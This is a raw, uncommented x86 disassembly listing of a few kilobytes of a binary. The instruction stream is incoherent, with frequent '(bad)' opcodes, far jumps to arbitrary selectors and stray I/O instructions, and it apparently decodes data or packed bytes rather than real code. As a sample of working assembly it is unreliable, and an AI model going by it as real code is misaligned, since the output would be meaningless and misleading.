  41abe2:	rcr    DWORD PTR [esi-0x6d8b72c6],cl
  41abe8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abe9:	(bad)  
  41abeb:	mov    ah,BYTE PTR [ecx-0x61013a6a]
  41abf1:	add    edx,DWORD PTR [ebx]
  41abf3:	shl    BYTE PTR [edx+0x15182986],cl
  41abf9:	neg    BYTE PTR [eax]
  41abfb:	sub    ecx,0x46
  41abfe:	or     al,BYTE PTR [eax-0x65]
  41ac01:	pextrw ebx,mm3,0x1e
  41ac05:	lea    ebx,[ebx]
  41ac07:	nop
  41ac08:	mov    BYTE PTR [ebx+0x5fdaafe7],al
  41ac0e:	retf   0xeb2c
  41ac11:	push   ss
  41ac12:	retf   
  41ac13:	das    
  41ac14:	xchg   esi,eax
  41ac15:	xor    edx,DWORD PTR [edi]
  41ac17:	add    ch,BYTE PTR [ebx]
  41ac19:	xchg   edi,eax
  41ac1a:	sbb    DWORD PTR [esi-0xbb3b539],edx
  41ac20:	leave  
  41ac21:	enter  0xb93,0x76
  41ac25:	xchg   ebx,eax
  41ac26:	and    BYTE PTR ds:0x676818fe,cl
  41ac2c:	retf   
  41ac2d:	mov    eax,ds:0xefdd1119
  41ac32:	hlt    
  41ac33:	test   DWORD PTR [ebx+0x2c8c1c4f],esi
  41ac39:	outs   dx,DWORD PTR ds:[esi]
  41ac3a:	mov    al,0x28
  41ac3c:	daa    
  41ac3d:	mov    dh,0x63
  41ac3f:	mov    cl,0xc8
  41ac41:	in     eax,dx
  41ac42:	mov    cl,0xc8
  41ac44:	push   0xc6c46c33
  41ac49:	jge    0x41ac09
  41ac4b:	ins    DWORD PTR es:[edi],dx
  41ac4c:	ror    BYTE PTR [ebx+esi*4-0x1b8d7b97],0x9a
  41ac54:	not    DWORD PTR ds:0x91053702
  41ac5a:	xchg   eax,ecx
  41ac5c:	jmp    0x41ac1d
  41ac5e:	mov    ah,0x61
  41ac60:	push   esi
  41ac61:	inc    eax
  41ac62:	out    0x3c,eax
  41ac64:	cld    
  41ac65:	loope  0x41ac90
  41ac67:	cmp    eax,0x1a94ab73
  41ac6c:	sbb    DWORD PTR [ebx],ecx
  41ac6e:	dec    eax
  41ac6f:	pop    eax
  41ac70:	cmp    eax,0x3798dc07
  41ac75:	xor    dl,BYTE PTR [ebp-0x6]
  41ac78:	fdiv   DWORD PTR [ebx+eiz*4+0x25d1951b]
  41ac7f:	or     esp,eax
  41ac81:	or     eax,0xacc77399
  41ac86:	jl     0x41ac28
  41ac88:	jecxz  0x41ace5
  41ac8a:	jge    0x41ac16
  41ac8c:	pop    ds
  41ac8d:	mov    es,WORD PTR [ecx]
  41ac8f:	mov    DWORD PTR [edi+0x232c7eee],0x88095973
  41ac99:	(bad)  
  41ac9a:	mov    DWORD PTR [edx-0x7],ecx
  41ac9d:	inc    esp
  41ac9e:	jmp    0x41ac5f
  41aca0:	loop   0x41ac7f
  41aca2:	sbb    DWORD PTR [esi+0x61],ebp
  41aca5:	int    0x91
  41aca7:	pusha  
  41aca8:	mov    cl,0x89
  41acaa:	add    eax,0x11fbb50
  41acaf:	jno    0x41aceb
  41acb1:	or     BYTE PTR [ebx-0x57],dl
  41acb4:	pop    ebp
  41acb5:	cmc    
  41acb6:	jg     0x41ad26
  41acb8:	xchg   ebx,eax
  41acb9:	push   ss
  41acba:	xchg   ecx,eax
  41acbb:	mov    ebx,0x5c1a2130
  41acc0:	mov    WORD PTR [edx+0xe],fs
  41acc3:	scas   al,BYTE PTR es:[edi]
  41acc4:	cmp    bl,bl
  41acc6:	cmp    esp,DWORD PTR [edx+esi*1]
  41acc9:	pop    esi
  41acca:	mov    BYTE PTR [eax+0x3f],bl
  41accd:	shl    dh,1
  41accf:	pop    ss
  41acd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acd1:	push   edi
  41acd2:	pop    ds
  41acd3:	cmp    esi,eax
  41acd5:	push   ds
  41acd6:	cld    
  41acd7:	aad    0x84
  41acd9:	jno    0x41aca0
  41acdb:	mov    ds:0xd5ec0217,al
  41ace0:	sahf   
  41ace1:	xor    ebx,DWORD PTR ds:0x8af26d0c
  41ace7:	data16 or BYTE PTR [ebx],bh
  41acea:	repz mov dl,0xe7
  41aced:	adc    esp,DWORD PTR [ecx+0x33ac8c92]
  41acf3:	add    al,0x3e
  41acf5:	loopne 0x41ad06
  41acf7:	loopne 0x41ac7c
  41acf9:	shl    ebx,1
  41acfb:	push   edi
  41acfc:	push   eax
  41acfd:	xor    BYTE PTR [ecx+0x2850b787],dh
  41ad03:	jne    0x41ad1b
  41ad05:	jmp    FWORD PTR [edi]
  41ad07:	(bad)  
  41ad08:	test   eax,0x2da9028b
  41ad0d:	cmc    
  41ad0e:	cld    
  41ad0f:	loope  0x41ad4b
  41ad11:	mov    bh,0x39
  41ad13:	pop    eax
  41ad14:	push   edx
  41ad15:	scas   al,BYTE PTR es:[edi]
  41ad16:	leave  
  41ad17:	loope  0x41ad18
  41ad19:	lock jno 0x41ad65
  41ad1c:	call   0xc4efffe1
  41ad21:	pop    eax
  41ad22:	daa    
  41ad23:	adc    cl,BYTE PTR [edx-0xe]
  41ad26:	dec    esp
  41ad27:	fdiv   st,st(4)
  41ad29:	cmp    BYTE PTR [edi],al
  41ad2b:	pop    ds
  41ad2c:	xchg   esi,eax
  41ad2d:	push   ss
  41ad2e:	adc    DWORD PTR [ebx+0x5d],esp
  41ad31:	and    esi,DWORD PTR ds:0x6ec912af
  41ad37:	sbb    eax,0x10bdc4b7
  41ad3c:	jge    0x41adb5
  41ad3e:	xor    DWORD PTR [ebx],ebp
  41ad40:	adc    eax,0xf3be7e1f
  41ad45:	pop    esp
  41ad46:	test   eax,0xf777d5a0
  41ad4b:	pop    esi
  41ad4c:	ror    BYTE PTR [esp+ebx*2],0x77
  41ad50:	cmp    DWORD PTR [edi+eiz*2-0x5e],esi
  41ad54:	sbb    DWORD PTR [ecx],0xaf2e2f10
  41ad5a:	mov    ebp,0xbfc070e4
  41ad5f:	pushf  
  41ad60:	push   cs
  41ad61:	ja     0x41adde
  41ad63:	daa    
  41ad64:	cmp    BYTE PTR ds:0xcf6a99a,ah
  41ad6a:	cmc    
  41ad6b:	ss dec esi
  41ad6d:	ins    DWORD PTR es:[edi],dx
  41ad6e:	and    ebx,ecx
  41ad70:	xchg   ebx,eax
  41ad71:	adc    al,0x5
  41ad73:	cmp    cl,BYTE PTR [edx]
  41ad75:	mov    ebp,0x4260a742
  41ad7a:	jae    0x41adda
  41ad7c:	or     al,0x64
  41ad7e:	push   edi
  41ad7f:	adc    eax,0x9d35b4a6
  41ad84:	nop
  41ad85:	ins    DWORD PTR es:[edi],dx
  41ad86:	in     eax,0xed
  41ad88:	sbb    edi,DWORD PTR [ecx+0x5c]
  41ad8b:	and    al,0x4b
  41ad8d:	daa    
  41ad8e:	mul    BYTE PTR [esp-0xf551ecd]
  41ad95:	sbb    DWORD PTR [edx],ebp
  41ad97:	push   ebx
  41ad98:	mov    ds:0x6d9ad468,al
  41ad9d:	ds mov bl,0x93
  41ada0:	sahf   
  41ada1:	add    BYTE PTR [ebp-0x1d],0xeb
  41ada5:	(bad)  
  41ada6:	outs   dx,BYTE PTR ds:[esi]
  41ada7:	arpl   WORD PTR [ebx-0x66],bp
  41adaa:	xor    al,0xf8
  41adac:	dec    esp
  41adad:	pop    es
  41adae:	push   ebx
  41adaf:	and    DWORD PTR [eax-0x76],esp
  41adb2:	imul   edi,DWORD PTR [ebx],0x2d
  41adb5:	les    esp,FWORD PTR [edx-0x6c]
  41adb8:	test   DWORD PTR [edx+0x7e60c3b0],0x6746e705
  41adc2:	push   ebx
  41adc3:	jle    0x41ad95
  41adc5:	mov    ds:0x4d2656f4,eax
  41adca:	into   
  41adcb:	push   edx
  41adcc:	adc    al,0xf0
  41adce:	pop    ecx
  41adcf:	jp     0x41ade1
  41add1:	xchg   ebp,eax
  41add2:	pop    es
  41add3:	es (bad) 
  41add5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41add6:	sbb    dh,dh
  41add8:	(bad)  
  41add9:	int3   
  41adda:	daa    
  41addb:	push   ss
  41addc:	cwde   
  41addd:	cmp    dh,BYTE PTR [esi]
  41addf:	ins    BYTE PTR es:[edi],dx
  41ade0:	pop    edx
  41ade1:	jl     0x41ada3
  41ade3:	das    
  41ade4:	sbb    bh,dl
  41ade6:	popa   
  41ade7:	(bad)  
  41ade8:	jmp    FWORD PTR [ecx+0x24912c89]
  41adee:	cmp    edx,DWORD PTR [ebx-0x1dffdc78]
  41adf4:	push   esp
  41adf5:	neg    ecx
  41adf7:	pushf  
  41adf8:	(bad)  
  41adf9:	jmp    0x51e57b3
  41adfe:	cld    
  41adff:	pop    ecx
  41ae00:	jbe    0x41adf8
  41ae02:	push   esp
  41ae03:	das    
  41ae04:	stos   BYTE PTR es:[edi],al
  41ae05:	sbb    BYTE PTR [ebp-0x1f2af231],bl
  41ae0b:	mov    BYTE PTR [eax],al
  41ae0d:	mov    cx,0x2b81
  41ae11:	xlat   BYTE PTR ds:[ebx]
  41ae12:	aad    0xa4
  41ae14:	xor    eax,0x78a75418
  41ae19:	ins    DWORD PTR es:[edi],dx
  41ae1a:	and    ch,BYTE PTR [eax+0x16a4adbc]
  41ae20:	or     ch,dh
  41ae22:	dec    ecx
  41ae23:	daa    
  41ae24:	pop    esp
  41ae25:	ins    BYTE PTR es:[edi],dx
  41ae26:	cld    
  41ae27:	jp     0x41ae45
  41ae29:	mov    cs,ebp
  41ae2b:	sbb    BYTE PTR [ebp+0x45],dh
  41ae2e:	mov    bh,0x7e
  41ae30:	icebp  
  41ae31:	arpl   WORD PTR cs:[edi-0x58],dx
  41ae35:	(bad)  
  41ae36:	fist   DWORD PTR [ecx+0x5bc324a]
  41ae3c:	push   esp
  41ae3d:	xchg   ecx,eax
  41ae3e:	push   edi
  41ae3f:	sub    eax,0x17ecde62
  41ae44:	in     eax,dx
  41ae45:	retf   0xd0c1
  41ae48:	mov    ah,BYTE PTR [ebp-0x30]
  41ae4b:	std    
  41ae4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae4d:	add    ebx,ebx
  41ae4f:	adc    al,cl
  41ae51:	and    DWORD PTR [edi-0x6c74736b],ebx
  41ae57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae58:	push   esp
  41ae59:	cwde   
  41ae5a:	sti    
  41ae5b:	cmp    eax,0x51c8b88f
  41ae60:	sub    cl,ch
  41ae62:	cs sub ecx,edi
  41ae65:	in     eax,dx
  41ae66:	mov    dh,0x12
  41ae68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae69:	es mov ah,0x70
  41ae6c:	jg     0x41ae34
  41ae6e:	fdivr  st(4),st
  41ae70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae71:	cwde   
  41ae72:	sub    eax,0xd9241d75
  41ae77:	jnp    0x41ae9c
  41ae79:	les    ecx,FWORD PTR [edi+0xe]
  41ae7c:	pop    ebx
  41ae7d:	into   
  41ae7e:	push   ebp
  41ae7f:	clc    
  41ae80:	mov    bl,0x43
  41ae82:	idiv   DWORD PTR [ecx]
  41ae84:	(bad)
  41ae87:	frstor [eax+0x25]
  41ae8a:	mov    gs,ecx
  41ae8c:	xor    eax,0xdae05aa
  41ae91:	cld    
  41ae92:	xor    ah,BYTE PTR [edi-0x5297f559]
  41ae98:	xchg   ebx,eax
  41ae99:	xor    ebp,esp
  41ae9b:	aam    0x65
  41ae9d:	push   ebx
  41ae9e:	dec    edi
  41ae9f:	rol    DWORD PTR [ebx-0x53],1
  41aea2:	push   0xffffffaa
  41aea4:	cs xchg ecx,eax
  41aea6:	(bad)  
  41aea7:	cmp    eax,0xbe5d1a7f
  41aeac:	push   edi
  41aead:	inc    edx
  41aeae:	jecxz  0x41af0a
  41aeb0:	pop    es
  41aeb1:	cmp    edi,eax
  41aeb3:	les    edi,FWORD PTR [edi]
  41aeb5:	add    ah,BYTE PTR [edx+0x33e5926a]
  41aebb:	cmp    DWORD PTR [eax+0x13],esi
  41aebe:	sbb    ecx,DWORD PTR [ecx]
  41aec0:	int    0x85
  41aec2:	test   eax,0x17a47dd
  41aec7:	mov    esi,0x95ce56a8
  41aecc:	push   edi
  41aecd:	xor    eax,0x84c0afb1
  41aed2:	xchg   ebp,eax
  41aed3:	std    
  41aed4:	or     BYTE PTR [edx-0x5b],0xf1
  41aed8:	mov    esp,0xa3995dd0
  41aedd:	into   
  41aede:	mov    al,0x3a
  41aee0:	xchg   edi,eax
  41aee1:	ror    BYTE PTR [esi-0x5d],0x1c
  41aee5:	xchg   BYTE PTR [ecx+0x15f537e0],ch
  41aeeb:	cmp    eax,0xae254915
  41aef0:	sbb    esp,DWORD PTR [esi-0x563d89d3]
  41aef6:	into   
  41aef7:	pop    esi
  41aef8:	lods   eax,DWORD PTR ds:[esi]
  41aef9:	fldcw  WORD PTR [edx+edx*2-0x51]
  41aefd:	call   0xbcdd:0x9ae7ed9f
  41af04:	fldz   
  41af06:	sbb    BYTE PTR [eax],0x7f
  41af09:	sub    DWORD PTR [edi+0x32258e7c],0x2030e912
  41af13:	add    dl,BYTE PTR [ecx-0xd]
  41af16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af17:	jmp    0x41aef2
  41af19:	mov    cl,0xfd
  41af1b:	aas    
  41af1c:	and    eax,0x170b3906
  41af21:	add    al,0x45
  41af23:	(bad)
  41af26:	repz push edx
  41af28:	lock mov al,ds:0x544aca3d
  41af2e:	test   al,0x20
  41af30:	stos   BYTE PTR es:[edi],al
  41af31:	std    
  41af32:	je     0x41af05
  41af34:	xchg   BYTE PTR [ebx],bl
  41af36:	or     al,0xec
  41af38:	popa   
  41af39:	push   ss
  41af3a:	jnp    0x41af3d
  41af3c:	sbb    BYTE PTR [ecx],al
  41af3e:	in     al,0x39
  41af40:	mov    eax,0x1f72f046
  41af45:	lock ss loopne 0x41af3a
  41af49:	out    0x6a,eax
  41af4b:	xlat   BYTE PTR ds:[ebx]
  41af4c:	xor    ecx,DWORD PTR [ecx+0x7c]
  41af4f:	(bad)  
  41af50:	lahf   
  41af51:	add    DWORD PTR [eax+esi*2],eax
  41af54:	push   edi
  41af55:	pushf  
  41af56:	sub    BYTE PTR [esi],cl
  41af58:	lahf   
  41af59:	sbb    ah,dh
  41af5b:	mov    ebx,0xebb1f06b
  41af60:	bound  ebp,QWORD PTR [ebx+eax*8-0x35]
  41af64:	jmp    0xe816:0x52a6ea3
  41af6b:	pop    esp
  41af6c:	out    dx,al
  41af6d:	adc    bh,BYTE PTR [edx-0xc60048d]
  41af73:	and    bl,ch
  41af75:	inc    esi
  41af76:	push   eax
  41af77:	and    al,0xb7
  41af79:	test   DWORD PTR ds:0xdde55a36,eax
  41af7f:	or     eax,ecx
  41af81:	fs inc ebx
  41af83:	adc    DWORD PTR [edx+0x67],eax
  41af86:	shl    DWORD PTR [ecx+0x52],0x97
  41af8a:	cs xor DWORD PTR es:[ecx],ebp
  41af8e:	and    edi,DWORD PTR [esi+0x7f]
  41af91:	(bad)
  41af95:	mov    ch,0x92
  41af97:	int    0xe2
  41af99:	mov    esp,DWORD PTR [esi-0x79db3a92]
  41af9f:	pop    esi
  41afa0:	ret    0xea3f
  41afa3:	dec    ebp
  41afa4:	mov    ds:0xcc7148b8,al
  41afa9:	jge    0x41afdc
  41afab:	cmp    ebx,DWORD PTR ds:[esp+edx*4+0x1db0943a]
  41afb3:	mov    bh,0xd4
  41afb5:	sub    al,BYTE PTR [edx+0x1b]
  41afb8:	adc    al,dl
  41afba:	jnp    0x41afb4
  41afbc:	push   ecx
  41afbd:	add    al,0xc8
  41afbf:	sub    esp,DWORD PTR [eax-0x48]
  41afc2:	addr16 icebp 
  41afc4:	movlps xmm5,QWORD PTR [ebx]
  41afc7:	jno    0x41af4f
  41afc9:	daa    
  41afca:	(bad)  
  41afcb:	or     ebp,DWORD PTR [edi]
  41afcd:	push   ecx
  41afce:	loope  0x41affb
  41afd0:	ret    0x279f
  41afd3:	xor    cl,dl
  41afd5:	push   es
  41afd6:	into   
  41afd7:	ds inc ecx
  41afd9:	inc    edx
  41afda:	clc    
  41afdb:	and    DWORD PTR [edx+0x68],ecx
  41afde:	cdq    
  41afdf:	inc    eax
  41afe0:	sub    DWORD PTR [ebx-0x3d],ecx
  41afe3:	cmp    al,0x8e
  41afe5:	test   DWORD PTR [esi+0x758498b6],edi
  41afeb:	cmp    ah,dl
  41afed:	shl    DWORD PTR [edx+ecx*8],0x33
  41aff1:	call   0x2584:0xd5da0b59
  41aff8:	pop    esp
  41aff9:	sbb    BYTE PTR [ebp*4+0x7edf63c2],dh
  41b000:	in     eax,dx
  41b001:	xchg   edx,eax
  41b002:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b003:	in     eax,0x46
  41b005:	sub    BYTE PTR [ecx],bl
  41b007:	hlt    
  41b008:	shl    dh,0xfe
  41b00b:	les    ecx,FWORD PTR [ebp-0x4187ac4b]
  41b011:	iret   
  41b012:	call   0xad0aa51
  41b017:	sub    al,0xde
  41b019:	mov    bh,0xd6
  41b01b:	hlt    
  41b01c:	add    eax,0xa72d403e
  41b021:	dec    eax
  41b022:	sbb    eax,0xaae2b041
  41b027:	jbe    0x41b01e
  41b029:	jbe    0x41b02c
  41b02b:	dec    ecx
  41b02c:	pushf  
  41b02d:	out    dx,eax
  41b02e:	mov    esi,0x3e82bff2
  41b033:	pop    ds
  41b034:	mov    ebx,0xb5732cf0
  41b039:	out    0x79,eax
  41b03b:	outs   dx,DWORD PTR ds:[esi]
  41b03c:	aaa    
  41b03d:	retf   0xb7f4
  41b040:	push   esi
  41b041:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b042:	jo     0x41b093
  41b044:	jnp    0x41b04b
  41b046:	ja     0x41b089
  41b048:	(bad)  
  41b049:	out    0xe,eax
  41b04b:	fild   DWORD PTR [ebx-0x2ea7af3f]
  41b051:	sti    
  41b052:	jle    0x41b024
  41b054:	imul   edi,DWORD PTR [esi-0x57],0xffffffe3
  41b058:	sub    ah,BYTE PTR [esi-0x4956204f]
  41b05e:	xlat   BYTE PTR ds:[ebx]
  41b05f:	int3   
  41b060:	cs dec edi
  41b062:	mov    bl,0xbe
  41b064:	fidivr WORD PTR [ecx+0x70]
  41b067:	jecxz  0x41b0a7
  41b069:	push   ecx
  41b06a:	fwait
  41b06b:	sbb    dh,BYTE PTR [eax]
  41b06d:	pop    esp
  41b06e:	sti    
  41b06f:	jns    0x41b0a3
  41b071:	cs pop esi
  41b073:	nop
  41b074:	out    0x46,eax
  41b076:	loopne 0x41b019
  41b078:	add    DWORD PTR [esi-0x3a3d7eb1],0xd8daa9b5
  41b082:	add    DWORD PTR [esp+edx*8+0x22a8b2b6],0x31
  41b08a:	ja     0x41b104
  41b08c:	push   edx
  41b08d:	cmp    bh,bh
  41b08f:	in     eax,dx
  41b090:	and    DWORD PTR [eax],edx
  41b092:	jmpw   0xf198
  41b096:	sub    DWORD PTR [edi+0x1dadd42a],edx
  41b09c:	fcomp  QWORD PTR [esi+ebx*4+0x1]
  41b0a0:	popa   
  41b0a1:	mov    ds:0x81b70ff1,eax
  41b0a6:	sub    al,ch
  41b0a8:	shl    DWORD PTR [eax-0x4b0a4a04],1
  41b0ae:	lahf   
  41b0af:	ds xchg esp,eax
  41b0b1:	ret    0x7833
  41b0b4:	inc    ebp
  41b0b5:	out    0xa7,eax
  41b0b7:	pop    eax
  41b0b8:	icebp  
  41b0b9:	adc    al,0x3a
  41b0bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0bc:	int3   
  41b0bd:	jne    0x41b0cc
  41b0bf:	je     0x41b103
  41b0c1:	push   eax
  41b0c2:	jmp    0xc994:0xbcd6d7d5
  41b0c9:	jge    0x41b0df
  41b0cb:	xchg   ebp,eax
  41b0cd:	cmp    bl,ah
  41b0cf:	sbb    ah,bh
  41b0d1:	jmp    0x41b125
  41b0d3:	out    0xbe,al
  41b0d5:	arpl   WORD PTR [eax],dx
  41b0d7:	mov    al,ds:0x622baf0c
  41b0dc:	lea    edx,[ebx+edx*1+0x4fa5a8a3]
  41b0e3:	shr    BYTE PTR [edx+0x7da7f33e],cl
  41b0e9:	repnz (bad) 
  41b0eb:	mov    eax,ds:0x13035b83
  41b0f0:	(bad)  
  41b0f1:	sahf   
  41b0f2:	call   0xf21e:0xd1545a5f
  41b0f9:	retf   0x832e
  41b0fc:	rol    BYTE PTR [esi+0x15fb7303],0x89
  41b103:	dec    edi
  41b104:	sub    BYTE PTR [ecx],0x7d
  41b107:	jae    0x41b15e
  41b109:	mov    dh,0x3e
  41b10b:	jno    0x41b17b
  41b10d:	repnz add BYTE PTR [edx],ch
  41b110:	cmp    dh,bh
  41b112:	cld    
  41b113:	push   esp
  41b114:	mov    ecx,DWORD PTR [edx+0x27a90ac2]
  41b11a:	sbb    al,BYTE PTR [esi-0x7]
  41b11d:	fs fs cwde 
  41b120:	loope  0x41b0bf
  41b122:	adc    bl,BYTE PTR [ecx]
  41b124:	sbb    eax,0x820fd392
  41b129:	arpl   WORD PTR [edi+0x3bc63354],di
  41b12f:	fwait
  41b130:	int    0x35
  41b132:	lods   al,BYTE PTR ds:[esi]
  41b133:	sub    BYTE PTR [ecx+0x5cfbf1da],dh
  41b139:	hlt    
  41b13a:	add    eax,0xb62f836e
  41b13f:	pop    es
  41b140:	jp     0x41b0c4
  41b142:	sbb    al,0x84
  41b144:	int    0x96
  41b146:	je     0x41b188
  41b148:	cmp    BYTE PTR ds:0x5ea6f965,0x20
  41b14f:	mov    ss,WORD PTR [eax]
  41b151:	cli    
  41b152:	retf   
  41b153:	ror    edx,cl
  41b155:	pop    esi
  41b156:	jge    0x41b1ab
  41b158:	sub    DWORD PTR [ebp-0x3a],ebp
  41b15b:	add    BYTE PTR [ecx+edx*4-0x53],cl
  41b15f:	sahf   
  41b160:	dec    ecx
  41b161:	and    ecx,DWORD PTR [ebx-0x7155863e]
  41b167:	bound  edx,QWORD PTR [ecx+0x4a3976e5]
  41b16d:	pop    ebp
  41b16e:	adc    ah,ah
  41b170:	sti    
  41b171:	(bad)  
  41b172:	dec    edx
  41b173:	and    esp,eax
  41b175:	mov    eax,ds:0x82e1cda9
  41b17a:	or     eax,DWORD PTR [esi]
  41b17c:	js     0x41b155
  41b17e:	in     al,0xf1
  41b180:	jg     0x41b164
  41b182:	and    al,0x3a
  41b184:	and    DWORD PTR [esi+0x51ae84ca],0x2a
  41b18b:	popf   
  41b18c:	push   esi
  41b18d:	out    0x2e,al
  41b18f:	adc    al,BYTE PTR [ebp-0x3413d37f]
  41b195:	aas    
  41b196:	mov    edi,0xda537ad4
  41b19b:	push   0xc9edb838
  41b1a0:	jl     0x41b126
  41b1a2:	or     eax,0x9f130961
  41b1a7:	clc    
  41b1a8:	dec    eax
  41b1a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1aa:	cmc    
  41b1ab:	ror    ah,0x1e
  41b1ae:	pop    edi
  41b1af:	mov    ds:0xc0b68d75,al
  41b1b4:	add    ebx,eax
  41b1b6:	jno    0x41b234
  41b1b8:	movq   mm5,mm4
  41b1bb:	mov    esp,0x24d708f3
  41b1c0:	adc    al,0x5d
  41b1c2:	popa   
  41b1c3:	in     al,dx
  41b1c4:	pop    edx
  41b1c5:	push   ebx
  41b1c6:	sar    DWORD PTR [edi+0x46],1
  41b1c9:	inc    eax
  41b1ca:	stos   BYTE PTR es:[edi],al
  41b1cb:	and    BYTE PTR [ebx],0x9e
  41b1ce:	test   al,0x8b
  41b1d0:	mov    BYTE PTR [esp+ecx*4],ah
  41b1d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1d4:	sti    
  41b1d5:	sbb    ch,BYTE PTR [edi+0x3b]
  41b1d8:	call   0x92e11e5c
  41b1dd:	div    dl
  41b1df:	xchg   ebp,eax
  41b1e0:	push   eax
  41b1e1:	jmp    0xb97a:0x73e4595e
  41b1e8:	and    dh,BYTE PTR [edx-0x3dfd0f2b]
  41b1ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1ef:	dec    edx
  41b1f0:	xor    eax,0x6c0c7a6f
  41b1f5:	xchg   esi,eax
  41b1f6:	pop    ebp
  41b1f7:	inc    edx
  41b1f8:	icebp  
  41b1f9:	pop    ebx
  41b1fa:	(bad)  
  41b1fb:	push   esp
  41b1fc:	cpuid  
  41b1fe:	bound  esp,QWORD PTR [edx+0x1f77c9a7]
  41b204:	aas    
  41b205:	(bad)  
  41b206:	scas   al,BYTE PTR es:[edi]
  41b207:	outs   dx,BYTE PTR ds:[esi]
  41b208:	shl    BYTE PTR [ebx-0x49],1
  41b20b:	mov    ah,0xa0
  41b20d:	add    eax,0xd029b1f3
  41b212:	lahf   
  41b213:	in     al,dx
  41b214:	xor    BYTE PTR [edi-0x21aebff9],al
  41b21a:	xor    ebp,DWORD PTR [ecx+ecx*1+0xdd9bc58]
  41b221:	icebp  
  41b222:	adc    BYTE PTR [edx-0x12],ch
  41b225:	dec    edi
  41b226:	pop    DWORD PTR [eax]
  41b228:	jl     0x41b1c8
  41b22a:	aaa    
  41b22b:	pop    es
  41b22c:	rcl    DWORD PTR [edx+0x3972484a],cl
  41b232:	aaa    
  41b233:	nop
  41b234:	sub    DWORD PTR [edi+0x19efb732],ecx
  41b23a:	(bad)  
  41b23b:	js     0x41b23a
  41b23d:	jo     0x41b1ca
  41b23f:	mov    ah,0x2
  41b241:	mul    BYTE PTR [edx+esi*8-0x6cd752e6]
  41b248:	lds    esp,FWORD PTR ds:0xfcafbb0c
  41b24e:	xchg   ecx,eax
  41b24f:	ficom  WORD PTR [esi]
  41b251:	in     al,0x41
  41b253:	mov    ds:0xc2f79e7a,al
  41b258:	xlat   BYTE PTR ds:[ebx]
  41b259:	sub    cl,BYTE PTR [ebx+0x11c7a47]
  41b25f:	sbb    dh,BYTE PTR [ecx-0x6b025da1]
  41b265:	adc    BYTE PTR [edx+0x70],bh
  41b268:	aam    0x6b
  41b26a:	jne    0x41b246
  41b26c:	mov    dh,0x7a
  41b26e:	mov    eax,ds:0x851441e6
  41b273:	dec    ebp
  41b274:	cwde   
  41b275:	stos   DWORD PTR es:[edi],eax
  41b276:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b277:	stc    
  41b278:	xchg   ecx,eax
  41b279:	lds    esi,FWORD PTR [esi+0x5bfdf176]
  41b27f:	adc    bh,BYTE PTR [esi+eiz*1+0x11921562]
  41b286:	inc    eax
  41b287:	int    0x56
  41b289:	pop    esp
  41b28a:	pushf  
  41b28b:	jl     0x41b26d
  41b28d:	dec    ebp
  41b28e:	(bad)  
  41b28f:	je     0x41b2ff
  41b291:	mov    WORD PTR [edi],cs
  41b293:	aam    0x33
  41b295:	ja     0x41b26d
  41b297:	jmp    0x41b29d
  41b299:	ins    BYTE PTR es:[edi],dx
  41b29a:	retf   
  41b29b:	pop    ds
  41b29c:	pop    ebp
  41b29d:	nop
  41b29e:	shl    esp,1
  41b2a0:	jecxz  0x41b2c2
  41b2a2:	lds    esi,FWORD PTR [eax]
  41b2a4:	sbb    ecx,DWORD PTR [esi]
  41b2a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2a7:	fs pusha 
  41b2a9:	jge    0x41b314
  41b2ab:	jmp    0x3a87:0xc8ce3bc4
  41b2b2:	int3   
  41b2b3:	inc    esi
  41b2b4:	and    DWORD PTR [edx+eiz*2-0xe],ebx
  41b2b8:	fucomp st(4)
  41b2ba:	push   ebx
  41b2bb:	add    al,0xa2
  41b2bd:	cld    
  41b2be:	fmul   st(5),st
  41b2c0:	sahf   
  41b2c1:	das    
  41b2c2:	cwde   
  41b2c3:	sub    al,0x4d
  41b2c5:	dec    esp
  41b2c6:	jb     0x41b2b8
  41b2c8:	pop    ebp
  41b2c9:	in     eax,dx
  41b2ca:	mov    bl,0xc5
  41b2cc:	push   ebp
  41b2cd:	pop    ebx
  41b2ce:	fbstp  TBYTE PTR [ebp-0x6]
  41b2d1:	out    dx,eax
  41b2d2:	add    cl,BYTE PTR [eax+0x7d]
  41b2d5:	inc    edx
  41b2d6:	xchg   edi,eax
  41b2d7:	mov    eax,ds:0x9597f317
  41b2dc:	pop    ds
  41b2dd:	enter  0x5dee,0x24
  41b2e1:	in     al,dx
  41b2e2:	adc    eax,0x7af72ded
  41b2e7:	sbb    esi,DWORD PTR [edi-0x53dff4a9]
  41b2ed:	adc    eax,0xe4fd8d97
  41b2f2:	call   0x4f78:0x391fbace
  41b2f9:	inc    edi
  41b2fa:	jge    0x41b288
  41b2fc:	pushf  
  41b2fd:	test   al,0x47
  41b2ff:	and    ah,cl
  41b301:	mov    ds:0x7aaa8677,al
  41b306:	cdq    
  41b307:	push   ds
  41b308:	adc    cl,BYTE PTR [esi+0x1a42ba04]
  41b30e:	or     DWORD PTR [eax-0x7f4bc540],ebx
  41b314:	mov    ecx,0x1e0b002d
  41b319:	push   ebx
  41b31a:	inc    edx
  41b31b:	ins    DWORD PTR es:[edi],dx
  41b31c:	jns    0x41b2ac
  41b31e:	loope  0x41b2d1
  41b320:	inc    esi
  41b321:	dec    esi
  41b322:	jle    0x41b32b
  41b324:	jg     0x41b30c
  41b326:	mov    esp,0x3113f2c5
  41b32b:	outs   dx,BYTE PTR ds:[esi]
  41b32c:	neg    esp
  41b32e:	pusha  
  41b32f:	imul   esi,DWORD PTR [esi-0x76],0xc26b128d
  41b336:	cmp    ebp,edx
  41b338:	adc    eax,0x797dccd8
